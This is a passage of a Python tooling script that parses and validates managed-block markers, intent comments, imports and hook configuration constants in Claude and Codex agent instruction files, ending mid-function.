#!/usr/bin/env python3
"""Read-only byte and Git-tree mechanics for Bridge skills."""

from __future__ import annotations

import argparse
import ast
import base64
import datetime
import hashlib
import json
import os
import re
import stat
import subprocess
import sys
import tempfile
from contextlib import ExitStack, contextmanager

# The guard must precede every import that may someday need 3.9+, so a too-old
# interpreter exits with the documented JSON error instead of a traceback.
if sys.version_info < (3, 9):
    print(
        json.dumps(
            {
                "error": "Python %d.%d is too old; sentinel_mechanics.py"
                " requires Python 3.9 or newer" % sys.version_info[:2]
            },
            ensure_ascii=False,
            indent=2,
        )
    )
    raise SystemExit(2)

from pathlib import Path, PurePosixPath
from typing import Any, Iterable, Mapping, Optional, get_type_hints


REGULAR_GIT_MODES = {"100644", "100755"}
GIT_TREE_DIRECTIONS = {
    "observe",
    "source-to-projection",
    "projection-to-source",
}
SEGMENT_PATTERN = rb"[A-Za-z0-9._-]+"
UNIT_ID_PATTERN = SEGMENT_PATTERN + rb"(?:/" + SEGMENT_PATTERN + rb")*"
SOURCE_PATH_PATTERN = UNIT_ID_PATTERN
MANAGED_START_PATTERN = re.compile(
    rb"<!-- bridge:managed:start id=("
    + UNIT_ID_PATTERN
    + rb") source=("
    + SOURCE_PATH_PATTERN
    + rb") -->"
)
MANAGED_END = b"<!-- bridge:managed:end -->"
CLAUDE_ONLY_START = b"<!-- bridge:claude-only:start -->"
CLAUDE_ONLY_END = b"<!-- bridge:claude-only:end -->"
LEGACY_MODE_PATTERN = re.compile(
    rb"<!-- bridge:managed:start id="
    + UNIT_ID_PATTERN
    + rb" source="
    + SOURCE_PATH_PATTERN
    + rb" mode=[^ \t]+ -->"
)
FENCE_PATTERN = re.compile(rb" {0,3}(?:```|~~~)")
ACTIVE_IMPORT_PATTERN = re.compile(rb"(?<!\S)@[A-Za-z0-9_./~-]+")
INTENT_PATTERN = re.compile(
    rb"<!-- bridge:intent (\d{4}-\d{2}-\d{2}) (.+) -->"
)
COVENANT_CONTROL = (
    b"<!-- bridge:covenant covenant/v3 source-tree/v5 report/v5 "
    b"reconciliation/v3 sync-plan/v3 -->"
)
PV2_PREFIX = (
    "Applies only while reading or editing files that match at least one "
    "of these source globs: "
)
PV2_SUFFIX = ". (bridge:pv2)"
UNIVERSAL_PATH_PATTERNS = {"**", "**/*"}
ACTIVATION_PROFILE_SPEC = "activation-fixture/v2"
CODEX_PROJECT_TRUST_VALUES = {"trusted", "untrusted", "unknown"}
CODEX_HOOKS_FEATURE_VALUES = {"enabled", "disabled", "unknown"}
REPORT_SPEC = "report/v5"
FINDINGS_HEADER = (
    "| surface | unit | host | state | suggested action | tier | annotations |"
)
FINDINGS_SEPARATOR = "|---|---|---|---|---|---|---|"
LIVE_ACTIVATION_OBSERVATIONS = {
    "surface-shadowed",
    "codex-activation-unresolved",
    "codex-root-unresolved",
    "fallback-shadow",
    "codex-effective-budget",
    "agents-md-budget-disabled",
    "agents-md-budget-exceeded",
    "agents-md-size",
    "codex-project-untrusted",
    "codex-hooks-feature-disabled",
}
CAPABILITY_OBSERVATIONS = {"mode-limited"}

HOOKS_JSON_INSPECTION_SPEC = "hooks-json-inspection/v1"
JSON_SPAN_SPEC = "json-span/v1"
HOOK_INTENT_SCAN_SPEC = "hook-intent-scan/v1"
HOOK_GROUP_RENDER_SPEC = "hook-group-render/v1"
HOOKS_JSON_COMPOSITION_SPEC = "hooks-json-composition/v1"
HOOK_HANDLER_COMPARISON_SPEC = "hook-handler-comparison/v1"
HOOK_DEGRADATION_RENDER_SPEC = "hook-degradation-render/v1"
HOOK_FENCE_SCAN_SPEC = "hook-fence-scan/v1"
SHARED_HOOK_EVENT_REGISTRY = "shared-events/2026-09-07"
SHARED_HOOK_EVENTS = frozenset(
    {
        "PostToolUse",
        "PreCompact",
        "PreToolUse",
        "PermissionRequest",
        "PostCompact",
        "SessionEnd",
        "SessionStart",
        "Stop",
        "SubagentStart",
        "SubagentStop",
        "UserPromptSubmit",
    }
)
CODEX_ONLY_HOOK_EVENTS = frozenset({"Interrupt"})
CODEX_HOOK_EVENTS = SHARED_HOOK_EVENTS | CODEX_ONLY_HOOK_EVENTS
CODEX_MATCHER_IGNORED_EVENTS = frozenset(
    {"Interrupt", "Stop", "UserPromptSubmit"}
)
STDOUT_DELIVERING_HOOK_EVENTS = frozenset(
    {"SessionStart", "UserPromptSubmit"}
)
HOOK_MATCHER_DOMAINS = {
    ("claude", "SessionStart"): frozenset(
        {"clear", "compact", "fork", "resume", "startup"}
    ),
    ("codex", "SessionStart"): frozenset(
        {"clear", "compact", "resume", "startup"}
    ),
    ("codex", "SessionEnd"): frozenset({"other"}),
}
HOOK_CLASSES = frozenset(
    {"gate", "observation", "reminder", "side-effect"}
)
PROSE_ELIGIBLE_HOOK_CLASSES = frozenset({"observation", "reminder"})
HOOK_TIERS = frozenset({"declared-unsynced", "native", "semantic"})
HOOK_SURFACES = {
    "claude": frozenset({"intent-doc", "none", "settings-json"}),
    "codex": frozenset({"agents-md", "codex-hooks-json", "none"}),
}
HOOK_JSON_SURFACES = {
    "claude": "settings-json",
    "codex": "codex-hooks-json",
}
HOOK_PROSE_SURFACES = {"claude": "intent-doc", "codex": "agents-md"}
HOOK_CARRIER_PATHS = {
    "claude": ".claude/settings.json",
    "codex": ".codex/hooks.json",
}
HOOK_OVERRIDE_REASONS = frozenset(
    {
        "env-placeholder",
        "matcher-domain",
        "matcher-grammar",
        "platform-command",
        "timeout-cap",
    }
)
HOOK_OVERRIDE_KEYS = {
    "claude": ("command", "matcher", "shell", "timeout"),
    "codex": ("command", "commandWindows", "matcher", "timeout"),
}
HOOK_TARGET_KEYS = {
    "claude": (
        "command",
        "matcher",
        "override-reason",
        "shell",
        "surface",
        "tier",
        "timeout",
    ),
    "codex": (
        "command",
        "commandWindows",
        "matcher",
        "override-reason",
        "surface",
        "tier",
        "timeout",
    ),
}
HOOK_CLAUDE_SHELLS = frozenset({"bash", "powershell"})
HOOK_PASSTHROUGH_KEYS = {
    "claude": frozenset({"if"}),
    "codex": frozenset({"additionalContextLimit"}),
}
HOOK_SEMANTICS_CHANGING_KEYS = {
    "claude": frozenset({"args", "async", "asyncRewake", "once"}),
    "codex": frozenset({"async"}),
}
HOOK_NEVER_PROJECT_TYPES = frozenset(
    {"agent", "http", "mcp_tool", "prompt"}
)
HOOK_HANDLER_KEY_ORDER = (
    "type",
    "command",
    "commandWindows",
    "timeout",
    "statusMessage",
)
HOOK_HANDLER_TRAILING_KEY_ORDER = ("shell",)
HOOK_GROUP_KEY_ORDER = ("matcher", "hooks")
HOOK_DECLARED_HANDLER_KEYS = frozenset(
    HOOK_HANDLER_KEY_ORDER + HOOK_HANDLER_TRAILING_KEY_ORDER
)
HOOK_HOST_HANDLER_KEYS = {
    "claude": frozenset(
        {"command", "shell", "statusMessage", "timeout", "type"}
    ),
    "codex": frozenset(
        {
            "command",
            "commandWindows",
            "statusMessage",
            "timeout",
            "type",
        }
    ),
}
CODEX_TRUST_IDENTITY_FIELDS = (
    "additionalContextLimit",
    "async",
    "command",
    "matcher",
    "statusMessage",
    "timeout",
)
CODEX_DEFAULT_HOOK_TIMEOUT = 600
CODEX_SHORT_TIMEOUT_EVENTS = frozenset({"Interrupt", "SessionEnd"})
HOOK_TIMEOUT_RANGES = {
    ("codex", "short"): (1, 3),
    ("codex", "default"): (1, 600),
    ("claude", "short"): (1, 60),
    ("claude", "default"): (1, None),
}
HOOK_INTENT_DOCUMENT = ".claude/rules/hooks.md"
HOOK_BULLET_LABELS = (
    "Trigger",
    "Purpose",
    "Command",
    "Environment",
    "Failure policy",
)
HOOK_BLOCK_ID_PATTERN = re.compile(r"hooks/[a-z0-9][a-z0-9-]*")
HOOK_BULLET_FOLD_PATTERN = re.compile(r"\n[ \t]*")
HOOK_MARKER_PATTERN = re.compile(r"^\[bridge:([a-z0-9][a-z0-9-]*)\](.*)$")
HOOKS_SHARED_EXECUTION_PATTERN = re.compile(
    rb"<!-- bridge:hooks-shared-execution (\d{4}-\d{2}-\d{2}) acknowledged:"
    rb" committed Claude hooks run for every clone without a trust prompt"
    rb" -->"
)
HOOK_ENTRY_HEADING_PATTERN = re.compile(
    rb"^## hook: ([a-z0-9][a-z0-9-]*)$"
)
HOOK_YAML_FENCE_OPEN = b"```yaml"
HOOK_YAML_FENCE_CLOSE = b"```"
HOOK_YAML_KEY_PATTERN = re.compile(
    r"^(?P<key>[A-Za-z][A-Za-z0-9_-]*):(?: (?P<value>.*))?$"
)
HOOK_CLAUDE_LIST_MATCHER_CLASS = re.compile(r"^[A-Za-z0-9_ ,|-]*$")
HOOK_CLAUDE_LIST_SEPARATORS = re.compile(r"[,|]")
HOOK_REGEX_METACHARACTER_PATTERN = re.compile(r"[.^$*+?()\[\]{}|\\]")
HOOK_RECORD_DATE_PATTERN = re.compile(r"\d{4}-\d{2}-\d{2}")
HOOK_FENCE_COMMAND_PATTERN = re.compile(
    r"^bridge-fixture-noop( [a-z0-9-]+)?$"
)
HOOK_FENCE_CARRIER_NAMES = (
    ".claude/settings.json",
    ".claude/settings.local.json",
    ".codex/hooks.json",
)
HOOK_FENCE_TOML_CARRIER = ".codex/config.toml"
TOML_TABLE_HEADER_PATTERN = re.compile(r"\s*\[\[?(?P<path>[^\[\]]*)\]\]?\s*")
TOML_INLINE_HOOKS_PATTERN = re.compile(r"hooks\s*=")
TOML_HOOK_COMMAND_PATTERN = re.compile(
    r"(?<![A-Za-z0-9_-])"
    r"(?P<key>command|commandWindows|command_windows)\s*=\s*"
    r"(?P<value>\"(?:[^\"\\]|\\.)*\"|'[^']*')"
)
HOOK_JSON_INDENT_UNITS = ("  ", "    ", "\t")
HOOK_DEGRADATION_TEMPLATE = "hd1"
INTENT_DOC_ANOMALY_REASONS = (
    "bullet-missing",
    "class-missing",
    "degradation-ineligible",
    "duplicate-id",
    "duplicate-ownership",
    "enabled-by-malformed",
    "enabled-by-missing",
    "enum-invalid",
    "field-invalid",
    "field-missing",
    "id-heading-mismatch",
    "matcher-domain",
    "matcher-ignored",
    "override-without-reason",
    "reason-without-override",
    "shared-execution-unacknowledged",
    "surface-host-mismatch",
    "tier-surface-mismatch",
    "tier-unsupported-event",
    "timeout-out-of-range",
    "unrecognized-field",
    "yaml-block-count",
)
HOOK_INTENT_ADVISORIES = (
    "event-unverified",
    "hook-output-not-delivered",
    "matcher-grammar-divergent",
    "platform-branch-divergence",
)
# Members of INTENT_DOC_ANOMALY_REASONS that never invalidate an entry: they
# emit no intent-doc-anomaly, leave every unit row intact, and only name the
# condition the write side reports as a closure-scoped blocker. They travel on
# the separate entry["lints"] channel so the anomaly registry stays closed.
NON_INVALIDATING_INTENT_LINTS = (
    "enabled-by-missing",
    "shared-execution-unacknowledged",
)
HOOK_CARRIER_FAILURE_REASONS = (
    "carrier-absent",
    "duplicate-key",
    "event-absent",
    "group-ambiguous",
    "hooks-key-absent",
    "json-parse-error",
    "unmodelled",
)



def normalize_n(data: bytes) -> bytes:
    """Apply the specification's closed normalization set N."""
    normalized = data.replace(b"\r\n", b"\n").replace(b"\r", b"\n")
    lines = [line.rstrip(b" \t") for line in normalized.split(b"\n")]
    while lines and lines[-1] == b"":
        lines.pop()
    if not lines:
        return b""
    return b"\n".join(lines) + b"\n"



def byte_records(data: bytes) -> list[dict[str, Any]]:
    """Split CRLF, LF, and lone-CR lines while retaining exact byte offsets."""

    records: list[dict[str, Any]] = []
    start = 0
    line_number = 1
    index = 0
    while index < len(data):
        value = data[index]
        if value not in (0x0A, 0x0D):
            index += 1
            continue
        if value == 0x0D and index + 1 < len(data) and data[index + 1] == 0x0A:
            end = index + 2
            eol = b"\r\n"
        else:
            end = index + 1
            eol = bytes((value,))
        records.append(
            {
                "line": line_number,
                "start": start,
                "content_end": index,
                "end": end,
                "content": data[start:index],
                "eol": eol,
            }
        )
        start = end
        index = end
        line_number += 1
    if start < len(data):
        records.append(
            {
                "line": line_number,
                "start": start,
                "content_end": len(data),
                "end": len(data),
                "content": data[start:],
                "eol": b"",
            }
        )
    return records



def fence_line(content: bytes) -> bool:
    """Apply the specification's deliberately simple fence toggle rule."""

    return FENCE_PATTERN.match(content) is not None



def expected_source_for_id(
    unit_id: str, *, entry_source: Optional[str]
) -> Optional[str]:
    if unit_id == "entry":
        return entry_source
    if unit_id.startswith("rules/"):
        suffix = unit_id[len("rules/") :]
        return f".claude/rules/{suffix}.md"
    if HOOK_BLOCK_ID_PATTERN.fullmatch(unit_id) is not None:
        return HOOK_INTENT_DOCUMENT
    return None



def complement_spans(
    length: int, excluded: Iterable[tuple[int, int]]
) -> list[dict[str, int]]:
    spans: list[dict[str, int]] = []
    cursor = 0
    for start, end in sorted(excluded):
        if start < cursor or end < start or end > length:
            raise ValueError("invalid or overlapping excluded byte spans")
        if cursor < start:
            spans.append({"start": cursor, "end": start})
        cursor = end
    if cursor < length:
        spans.append({"start": cursor, "end": length})
    return spans



def inspect_managed_blocks(
    data: bytes,
    *,
    entry_source: Optional[str] = None,
    owned_ids: Iterable[str] = (),
) -> dict[str, Any]:
    """Parse v4 root-AGENTS blocks and return exact structural byte spans."""

    records = byte_records(data)
    blocks: list[dict[str, Any]] = []
    anomalies: list[dict[str, Any]] = []
    active: Optional[dict[str, Any]] = None
    fence_open = False
    seen: dict[str, int] = {}

    for record in records:
        content = record["content"]
        if fence_line(content):
            fence_open = not fence_open
            continue
        if fence_open:
            continue
        legacy = LEGACY_MODE_PATTERN.fullmatch(content)
        if legacy is not None:
            anomalies.append(
                {
                    "kind": "legacy-managed-mode",
                    "line": record["line"],
                    "start": record["start"],
                    "end": record["end"],
                }
            )
            continue
        start_match = MANAGED_START_PATTERN.fullmatch(content)
        if start_match is not None:
            if active is not None:
                anomalies.append(
                    {
                        "kind": "nested-start",
                        "line": record["line"],
                        "start": record["start"],
                        "end": record["end"],
                    }
                )
                continue
            unit_id = start_match.group(1).decode("ascii")
            source = start_match.group(2).decode("ascii")
            active = {
                "id": unit_id,
                "source": source,
                "start_line": record["line"],
                "start": record["start"],
                "marker_end": record["end"],
                "body_start": record["end"],
            }
            continue
        if content != MANAGED_END:
            continue
        if active is None:
            anomalies.append(
                {
                    "kind": "orphan-end",
                    "line": record["line"],
                    "start": record["start"],
                    "end": record["end"],
                }
            )
            continue
        block = dict(active)
        block.update(
            {
                "body_end": record["start"],
                "end_marker_start": record["start"],
                "end_line": record["line"],
                "end": record["end"],
            }
        )
        unit_id = block["id"]
        ordinal = seen.get(unit_id, 0) + 1
        seen[unit_id] = ordinal
        block["ordinal"] = ordinal
        if ordinal > 1:
            anomalies.append(
                {
                    "kind": "duplicate-id",
                    "id": unit_id,
                    "ordinal": ordinal,
                    "line": block["start_line"],
                    "start": block["start"],
                    "end": block["marker_end"],
                }
            )
        expected_source = expected_source_for_id(
            unit_id, entry_source=entry_source
        )
        block["expected_source"] = expected_source
        block["source_matches"] = (
            expected_source is None or expected_source == block["source"]
        )
        if not block["source_matches"]:
            anomalies.append(
                {
                    "kind": "source-mismatch",
                    "id": unit_id,
                    "line": block["start_line"],
                    "start": block["start"],
                    "end": block["marker_end"],
                    "actual": block["source"],
                    "expected": expected_source,
                }
            )
        block["body_sha256"] = hashlib.sha256(
            data[block["body_start"] : block["body_end"]]
        ).hexdigest()
        blocks.append(block)
        active = None

    if active is not None:
        anomalies.append(
            {
                "kind": "unclosed-block",
                "id": active["id"],
                "line": active["start_line"],
                "start": active["start"],
                "end": active["marker_end"],
            }
        )

    owned = set(owned_ids)
    structural_spans = [(block["start"], block["end"]) for block in blocks]
    owned_spans = [
        (block["start"], block["end"])
        for block in blocks
        if block["id"] in owned and block["ordinal"] == 1
    ]
    interstitial = complement_spans(len(data), structural_spans)
    manual = complement_spans(len(data), owned_spans)
    for span in interstitial:
        span["sha256"] = hashlib.sha256(
            data[span["start"] : span["end"]]
        ).hexdigest()
    for span in manual:
        span["sha256"] = hashlib.sha256(
            data[span["start"] : span["end"]]
        ).hexdigest()
    return {
        "contract": "managed-block-map/v2",
        "bytes": len(data),
        "sha256": hashlib.sha256(data).hexdigest(),
        "trustworthy": not anomalies,
        "blocks": blocks,
        "anomalies": anomalies,
        "interstitial_spans": interstitial,
        "manual_spans": manual,
        "owned_ids": sorted(owned),
    }



def inspect_claude_only(data: bytes) -> dict[str, Any]:
    """Find subtractable Claude-only pairs with marker/fence semantics."""

    records = byte_records(data)
    spans: list[dict[str, int]] = []
    anomalies: list[dict[str, Any]] = []
    active: Optional[dict[str, int]] = None
    fence_open = False
    for record in records:
        content = record["content"]
        if fence_line(content):
            fence_open = not fence_open
            continue
        if fence_open:
            continue
        if content == CLAUDE_ONLY_START:
            if active is not None:
                anomalies.append(
                    {
                        "kind": "nested-claude-only-start",
                        "line": record["line"],
                        "start": record["start"],
                        "end": record["end"],
                    }
                )
                continue
            active = {
                "line": record["line"],
                "start": record["start"],
            }
            continue
        if content != CLAUDE_ONLY_END:
            continue
        if active is None:
            anomalies.append(
                {
                    "kind": "orphan-claude-only-end",
                    "line": record["line"],
                    "start": record["start"],
                    "end": record["end"],
                }
            )
            continue
        spans.append(
            {
                "start": active["start"],
                "end": record["end"],
                "start_line": active["line"],
                "end_line": record["line"],
            }
        )
        active = None
    if active is not None:
        anomalies.append(
            {
                "kind": "unclosed-claude-only",
                "line": active["line"],
                "start": active["start"],
                "end": len(data),
            }
        )
    return {
        "spans": spans,
        "anomalies": anomalies,
    }



def parse_intent_line(
    content: bytes,
) -> Optional[tuple[datetime.date, str]]:
    match = INTENT_PATTERN.fullmatch(content)
    if match is None:
        return None
    try:
        intent_date = datetime.date.fromisoformat(
            match.group(1).decode("ascii")
        )
        note = match.group(2).decode("utf-8")
    except (UnicodeError, ValueError):
        return None
    if not (1 <= len(note) <= 120):
        return None
    if (
        note != note.strip(" \t\n\r\v\f")
        or "--" in note
        or "\x00" in note
    ):
        return None
    return intent_date, note



def valid_intent_line(content: bytes) -> bool:
    return parse_intent_line(content) is not None



def recognized_frontmatter_span(
    records: list[dict[str, Any]], *, kind: str
) -> Optional[tuple[int, int, int]]:
    if kind != "rule" or not records or records[0]["content"] != b"---":
        return None
    for index, record in enumerate(records[1:], start=1):
        if record["content"] == b"---":
            return 0, record["end"], index + 1
    return None



def control_header(
    records: list[dict[str, Any]],
    *,
    start_index: int,
    kind: str,
) -> tuple[list[dict[str, Any]], int, list[dict[str, Any]]]:
    protected: list[dict[str, Any]] = []
    errors: list[dict[str, Any]] = []
    index = start_index
    previous_intent_date: Optional[datetime.date] = None
    if kind == "covenant":
        if index >= len(records) or records[index]["content"] != COVENANT_CONTROL:
            errors.append({"kind": "invalid-covenant-control"})
            return protected, index, errors
        record = records[index]
        protected.append(
            {
                "kind": "covenant-control",
                "start": record["start"],
                "end": record["end"],
            }
        )
        index += 1
    while index < len(records):
        parsed_intent = parse_intent_line(records[index]["content"])
        if parsed_intent is None:
            break
        record = records[index]
        intent_date, _ = parsed_intent
        protected.append(
            {
                "kind": "intent",
                "start": record["start"],
                "end": record["end"],
            }
        )
        if (
            previous_intent_date is not None
            and intent_date < previous_intent_date
        ):
            errors.append(
                {
                    "kind": "intent-not-oldest-first",
                    "line": record["line"],
                    "date": intent_date.isoformat(),
                    "previous_date": previous_intent_date.isoformat(),
                }
            )
        previous_intent_date = intent_date
        index += 1
    if kind == "covenant" and not any(
        span["kind"] == "intent" for span in protected
    ):
        errors.append({"kind": "missing-covenant-intent"})
    return protected, index, errors



def control_comment_anomalies(
    data: bytes, protected: Iterable[Mapping[str, Any]]
) -> list[dict[str, Any]]:
    recognized = {
        (int(span["start"]), int(span["end"]))
        for span in protected
        if span["kind"] in {"covenant-control", "intent", "claude-only"}
    }
    anomalies: list[dict[str, Any]] = []
    fence_open = False
    for record in byte_records(data):
        content = record["content"]
        if fence_line(content):
            fence_open = not fence_open
            continue
        if fence_open or not content.startswith(b"<!-- bridge:"):
            continue
        if any(
            record["start"] >= start and record["end"] <= end
            for start, end in recognized
        ):
            continue
        kind = (
            "misplaced-intent"
            if INTENT_PATTERN.fullmatch(content)
            else "unknown-control-comment"
        )
        anomalies.append(
            {
                "kind": kind,
                "line": record["line"],
                "start": record["start"],
                "end": record["end"],
            }
        )
    return anomalies



def inline_code_spans(
    content: bytes,
    *,
    excluded_spans: Iterable[tuple[int, int]] = (),
) -> list[tuple[int, int]]:
    """Return matched backtick spans without crossing excluded fenced spans."""

    spans: list[tuple[int, int]] = []
    excluded = sorted(excluded_spans)

    def containing(position: int) -> Optional[tuple[int, int]]:
        for start, end in excluded:
            if start <= position < end:
                return start, end
            if start > position:
                break
        return None

    index = 0
    while index < len(content):
        unavailable = containing(index)
        if unavailable is not None:
            index = unavailable[1]
            continue
        if content[index] != 0x60:
            index += 1
            continue
        run_start = index
        while index < len(content) and content[index] == 0x60:
            index += 1
        run_length = index - run_start
        search = index
        closing: Optional[tuple[int, int]] = None
        while search < len(content):
            unavailable = containing(search)
            if unavailable is not None:
                search = unavailable[1]
                continue
            if content[search] != 0x60:
                search += 1
                continue
            close_start = search
            while search < len(content) and content[search] == 0x60:
                search += 1
            if search - close_start == run_length:
                closing = (close_start, search)
                break
        if closing is None:
            index = run_start + run_length
            continue
        spans.append((run_start, closing[1]))
        index = closing[1]
    return spans



def fenced_code_spans(data: bytes) -> list[tuple[int, int]]:
    spans: list[tuple[int, int]] = []
    opened: Optional[int] = None
    for record in byte_records(data):
        if not fence_line(record["content"]):
            continue
        if opened is None:
            opened = record["start"]
        else:
            spans.append((opened, record["end"]))
            opened = None
    if opened is not None:
        spans.append((opened, len(data)))
    return spans



def active_imports(
    data: bytes,
    *,
    included_spans: Optional[Iterable[tuple[int, int]]] = None,
) -> list[dict[str, Any]]:
    """Locate active Claude imports outside inline and fenced code."""

    requested = (
        [(0, len(data))]
        if included_spans is None
        else sorted(included_spans)
    )
    allowed: list[tuple[int, int]] = []
    for start, end in requested:
        if not (0 <= start <= end <= len(data)):
            raise ValueError("active-import included span is out of range")
        if start == end:
            continue
        if allowed and start < allowed[-1][1]:
            raise ValueError("active-import included spans overlap")
        if allowed and start == allowed[-1][1]:
            allowed[-1] = (allowed[-1][0], end)
        else:
            allowed.append((start, end))

    projected = bytearray()
    projection_map: list[dict[str, int]] = []
    for source_start, source_end in allowed:
        projected_start = len(projected)
        projected.extend(data[source_start:source_end])
        projection_map.append(
            {
                "projected_start": projected_start,
                "projected_end": len(projected),
                "source_start": source_start,
                "source_end": source_end,
            }
        )
    projected_bytes = bytes(projected)
    fenced = fenced_code_spans(projected_bytes)
    code_spans = inline_code_spans(
        projected_bytes, excluded_spans=fenced
    )
    unavailable = fenced + code_spans
    records = byte_records(data)

    def source_span(start: int, end: int) -> Optional[tuple[int, int]]:
        for span in projection_map:
            if (
                start >= span["projected_start"]
                and end <= span["projected_end"]
            ):
                offset = start - span["projected_start"]
                return (
                    span["source_start"] + offset,
                    span["source_start"] + offset + (end - start),
                )
        return None

    def line_for(offset: int) -> int:
        for record in records:
            if record["start"] <= offset < record["end"]:
                return int(record["line"])
        return len(records) if records else 1

    results: list[dict[str, Any]] = []
    for match in ACTIVE_IMPORT_PATTERN.finditer(projected_bytes):
        projected_start = match.start()
        projected_end = match.end()
        mapped = source_span(projected_start, projected_end)
        if mapped is None:
            continue
        if any(
            projected_start >= start and projected_end <= end
            for start, end in unavailable
        ):
            continue
        absolute_start, absolute_end = mapped
        results.append(
            {
                "token": match.group(0).decode("ascii"),
                "line": line_for(absolute_start),
                "start": absolute_start,
                "end": absolute_end,
            }
        )
    return results



def validate_render_paths(paths: Any) -> list[str]:
    """Apply v4 checks that do not require general YAML or brace expansion."""

    errors: list[str] = []
    if paths is None:
        return errors
    if not isinstance(paths, list) or not paths:
        return ["paths-not-nonempty-list"]
    seen: set[str] = set()
    for index, pattern in enumerate(paths):
        prefix = f"paths[{index}]"
        if not isinstance(pattern, str):
            errors.append(f"{prefix}:not-string")
            continue
        try:
            pattern.encode("utf-8")
        except UnicodeEncodeError:
            errors.append(f"{prefix}:invalid-unicode-scalar")
        if not pattern.strip(" \t"):
            errors.append(f"{prefix}:ascii-whitespace-only")
        if pattern in seen:
            errors.append(f"{prefix}:duplicate")
        seen.add(pattern)
        if pattern in UNIVERSAL_PATH_PATTERNS:
            errors.append(f"{prefix}:universal-no-op")
        if pattern.startswith("/"):
            errors.append(f"{prefix}:leading-slash")
        if any(value in pattern for value in ("\x00", "\r", "\n", "`", "\\")):
            errors.append(f"{prefix}:forbidden-character")
        segments = pattern.split("/")
        if any(segment in {"", ".", ".."} for segment in segments):
            errors.append(f"{prefix}:invalid-segment")
        position = 0
        while True:
            opening = pattern.find("[", position)
            if opening < 0:
                break
            closing = pattern.find("]", opening + 1)
            if closing < 0:
                errors.append(f"{prefix}:unclosed-bracket")
                break
            position = closing + 1
    return errors



def render_preamble(paths: list[str]) -> bytes:
    errors = validate_render_paths(paths)
    if errors:
        raise ValueError("invalid v4 render paths: " + ", ".join(errors))
    rendered = ", ".join(f"`{pattern}`" for pattern in paths)
    return (PV2_PREFIX + rendered + PV2_SUFFIX + "\n\n").encode("utf-8")



def parse_preamble(data: bytes) -> dict[str, Any]:
    records = byte_records(data)
    if not records:
        return {"present": False, "valid": True, "paths": [], "end": 0}
    try:
        line = records[0]["content"].decode("utf-8")
    except UnicodeError:
        return {"present": False, "valid": False, "paths": [], "end": 0}
    if not line.startswith(PV2_PREFIX):
        return {"present": False, "valid": True, "paths": [], "end": 0}
    if not line.endswith(PV2_SUFFIX):
        return {"present": True, "valid": False, "paths": [], "end": 0}
    encoded = line[len(PV2_PREFIX) : -len(PV2_SUFFIX)]
    paths: list[str] = []
    index = 0
    while index < len(encoded):
        if encoded[index] != "`":
            return {"present": True, "valid": False, "paths": [], "end": 0}
        closing = encoded.find("`", index + 1)
        if closing < 0:
            return {"present": True, "valid": False, "paths": [], "end": 0}
        paths.append(encoded[index + 1 : closing])
        index = closing + 1
        if index == len(encoded):
            break
        if not encoded.startswith(", ", index):
            return {"present": True, "valid": False, "paths": [], "end": 0}
        index += 2
    if validate_render_paths(paths):
        return {"present": True, "valid": False, "paths": paths, "end": 0}
    if len(records) < 2 or records[1]["content"] != b"":
        return {"present": True, "valid": False, "paths": paths, "end": 0}
    return {
        "present": True,
        "valid": True,
        "paths": paths,
        "end": records[1]["end"],
    }



def render_agents_unit(
    data: bytes,
    *,
    kind: str,
    paths: Optional[list[str]],
) -> dict[str, Any]:
    """Render one v4 entry/rule/covenant unit plus a line origin map."""

    if kind not in {"entry", "rule", "covenant"}:
        raise ValueError(f"invalid agents unit kind: {kind}")
    if kind != "rule" and paths is not None:
        raise ValueError("only rule units accept paths")
    path_errors = validate_render_paths(paths)
    if path_errors:
        raise ValueError("invalid v4 render paths: " + ", ".join(path_errors))

    records = byte_records(data)
    protected: list[dict[str, Any]] = []
    errors: list[dict[str, Any]] = []
    if kind in {"entry", "rule"} and data.startswith(b"\xef\xbb\xbf"):
        errors.append(
            {
                "kind": "leading-utf8-bom",
                "line": 1,
                "start": 0,
                "end": 3,
            }
        )
    first_content_index = 0
    frontmatter = recognized_frontmatter_span(records, kind=kind)
    if frontmatter is not None:
        start, end, first_content_index = frontmatter
        protected.append(
            {"kind": "frontmatter", "start": start, "end": end}
        )
        if paths is None:
            errors.append({"kind": "frontmatter-without-validated-paths"})
    elif kind == "rule" and paths is not None:
        errors.append({"kind": "scoped-paths-without-frontmatter"})

    controls, first_content_index, control_errors = control_header(
        records, start_index=first_content_index, kind=kind
    )
    protected.extend(controls)
    errors.extend(control_errors)

    body_start = (
        records[first_content_index]["start"]
        if first_content_index < len(records)
        else len(data)
    )
    claude = inspect_claude_only(data[body_start:])
    for span in claude["spans"]:
        span["start"] += body_start
        span["end"] += body_start
        span["start_line"] += first_content_index
        span["end_line"] += first_content_index
    for anomaly in claude["anomalies"]:
        anomaly["start"] += body_start
        anomaly["end"] += body_start
        anomaly["line"] += first_content_index
    protected.extend(
        {
            "kind": "claude-only",
            "start": span["start"],
            "end": span["end"],
        }
        for span in claude["spans"]
    )
    errors.extend(claude["anomalies"])
    protected.sort(key=lambda span: (span["start"], span["end"]))
    errors.extend(control_comment_anomalies(data, protected))

    def overlaps_protected(record: Mapping[str, Any]) -> bool:
        return any(
            record["start"] < span["end"] and record["end"] > span["start"]
            for span in protected
        )

    shared_records = [
        record
        for record in records[first_content_index:]
        if not overlaps_protected(record)
    ]
    while shared_records and not shared_records[0]["content"].rstrip(b" \t"):
        record = shared_records.pop(0)
        protected.append(
            {
                "kind": "leading-blank",
                "start": record["start"],
                "end": record["end"],
            }
        )
    included = [(record["start"], record["end"]) for record in shared_records]
    imports = active_imports(data, included_spans=included)
    errors.extend(
        {
            "kind": "active-import",
            "token": item["token"],
            "line": item["line"],
            "start": item["start"],
            "end": item["end"],
        }
        for item in imports
    )

    output = bytearray()
    origin: list[dict[str, Any]] = []
    if paths:
        preamble = render_preamble(paths)
        output.extend(preamble)
        origin.append(
            {
                "kind": "generated-preamble",
                "render_start": 0,
                "render_end": len(preamble),
                "source_start": None,
                "source_end": None,
            }
        )
    for record in shared_records:
        rendered_line = record["content"].rstrip(b" \t") + b"\n"
        render_start = len(output)
        output.extend(rendered_line)
        origin.append(
            {
                "kind": "shared-line",
                "render_start": render_start,
                "render_end": len(output),
                "source_start": record["start"],
                "source_end": record["end"],
            }
        )
    rendered = normalize_n(bytes(output))
    if len(rendered) != len(output):
        while origin and origin[-1]["render_start"] >= len(rendered):
            origin.pop()
        if origin:
            origin[-1]["render_end"] = min(
                origin[-1]["render_end"], len(rendered)
            )
    protected.sort(key=lambda span: (span["start"], span["end"]))
    return {
        "contract": "agents-unit-render/v4",
        "kind": kind,
        "valid": not errors,
        "errors": errors,
        "paths": [] if paths is None else paths,
        "rendered": {
            "bytes": len(rendered),
